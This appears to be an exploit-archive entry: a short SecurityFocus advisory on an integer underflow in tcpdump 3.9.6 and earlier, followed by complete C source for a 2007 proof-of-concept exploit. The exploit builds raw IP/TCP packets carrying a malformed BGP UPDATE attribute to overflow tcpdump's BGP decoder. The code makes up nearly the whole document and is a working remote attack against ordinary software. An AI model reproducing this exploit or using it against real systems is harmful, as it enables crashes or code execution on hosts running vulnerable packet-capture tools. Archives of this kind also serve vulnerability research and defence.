@@ -1,0 +1,161 @@
+source: http://www.securityfocus.com/bid/24965/info
+
+The 'tcpdump' utility is prone to an integer-underflow vulnerability because it fails to bounds-check user-supplied input before copying it into an insufficiently sized memory buffer.
+
+An attacker can exploit this issue to execute arbitrary malicious code in the context of the user running the affected application. Failed exploit attempts will likely crash the affected application.
+
+This issue affects tcpdump 3.9.6 and prior versions.
+
+/* tcpdump-bgp.c
+ *
+ * tcpdump <= 3.9.6 BGP UPDATE remote overflow POC (lnx)
+ * by mu-b - July 2007
+ *
+ * - Tested on: tcpdump-3.9.6 (.tar.gz)
+ *
+ * simple snprintf length integer overflow...
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#define __FAVOR_BSD
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#define TH_PUSH   0x08
+
+#define PORT_BGP  179
+#define PKT_LEN   512
+
+#define BGPTYPE_MP_REACH_NLRI 14
+#define AFNUM_L2VPN           196
+#define SAFNUM_VPNUNICAST     128
+
+static unsigned short
+ip_sum (const unsigned short *ptr, int len)
+{
+  register int sum = 0;
+
+  while (len > 1)
+    {
+      sum += *ptr++;
+      len -= 2;
+    }
+
+  if (len == 1)
+    sum += *((unsigned char *) ptr);
+
+  sum = (sum >> 16) + (sum & 0xffff);
+  sum += (sum >> 16);
+
+  return (~sum);
+}
+
+int 
+main (void)
+{
+  int raw_fd, opt_val, *popt_val;
+  char buf[4096], *ptr;
+  struct ip *iph;
+  struct tcphdr *tcph;
+  struct sockaddr_in sin;
+
+  printf ("tcpdump <= 3.9.6 BGP UPDATE remote overflow POC\n"
+          "by mu-b <mu-b@digit-labs.org>\n"
+          "http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n");
+
+  if ((raw_fd = socket (PF_INET, SOCK_RAW, IPPROTO_TCP)) < 0)
+    {
+      perror ("socket ()");
+      exit (EXIT_FAILURE);
+    }
+
+  opt_val = 1;
+  popt_val = &opt_val;
+  if (setsockopt (raw_fd, IPPROTO_IP, IP_HDRINCL, popt_val, sizeof opt_val) < 0)
+    {
+      perror ("setsockopt ()");
+      exit (EXIT_FAILURE);
+    }
+
+  sin.sin_family = AF_INET;
+  sin.sin_port = htons (PORT_BGP);
+  sin.sin_addr.s_addr = inet_addr ("127.0.0.1");
+
+  memset (buf, 0, 4096);
+
+  iph = (struct ip *) buf;
+  iph->ip_hl = 5;
+  iph->ip_v = 4;
+  iph->ip_tos = 0;
+  iph->ip_len = htons (sizeof (struct ip) + sizeof (struct tcphdr) + PKT_LEN);
+  iph->ip_id = htonl (54321);
+  iph->ip_off = 0;
+  iph->ip_ttl = 255;
+  iph->ip_p = 6;
+  iph->ip_sum = 0;
+  iph->ip_src.s_addr = inet_addr ("1.2.3.4");
+  iph->ip_dst.s_addr = sin.sin_addr.s_addr;
+  iph->ip_sum = ip_sum ((unsigned short *) buf, sizeof (struct ip));
+
+  tcph = (struct tcphdr *) (buf + sizeof (struct ip));
+  tcph->th_sport = htons (65535);
+  tcph->th_dport = htons (PORT_BGP);
+  tcph->th_seq = rand ();
+  tcph->th_ack = 0;
+  tcph->th_x2 = 0;
+  tcph->th_off = sizeof (struct tcphdr) / 4;
+  tcph->th_flags = TH_PUSH;
+  tcph->th_win = htonl (65535);
+  tcph->th_sum = 0;
+  tcph->th_urp = 0;
+
+  ptr = buf + sizeof (struct ip) + sizeof (struct tcphdr);
+  
+  memset (ptr, 0xFF, 16);           /* marker */
+   ptr  += 16;
+  *ptr++ = 0x02;                    /* length */
+  *ptr++ = 0x00;
+  *ptr++ = 0x02;                    /* type = BGP_UPDATE */
+  *ptr++ = 0x00;                    /* length */
+  *ptr++ = 0x00;
+  *ptr++ = 0x00;                    /* length */
+  *ptr++ = 0xFF;
+
+  *ptr++ = 0x00;                    /* attr flags */
+  *ptr++ = BGPTYPE_MP_REACH_NLRI;   /* attr type */
+  *ptr++ = 0xFF;                    /* attr length */
+
+  *ptr++ = (AFNUM_L2VPN << 8) & 0xFF;
+  *ptr++ = AFNUM_L2VPN & 0xFF;
+  *ptr++ = SAFNUM_VPNUNICAST;
+  *ptr++ = 0x00;                    /* Next-HOP */
+  *ptr++ = 0x00;                    /* SNPA */
+
+  /* decode_labeled_vpn_l2 */
+  *ptr++ = 0xFF;                    /* tlen = plen */
+  *ptr++ = 0xFF;
+  memset (ptr, 0xFF, 15);           /* marker */
+   ptr  += 15;
+  *ptr++ = 0x01;                    /* type */
+  *ptr++ = 0x02;                    /* len */
+  *ptr++ = 0x50;
+
+  memset (ptr, 0x41, PKT_LEN);
+
+  if (sendto (raw_fd, buf, sizeof (struct ip) + sizeof (struct tcphdr) + PKT_LEN, 0,
+              (struct sockaddr *) &sin, sizeof (sin)) < 0)
+    {
+      perror ("sendto ()");
+      exit (EXIT_FAILURE);
+    }
+
+  return (EXIT_SUCCESS);
+}
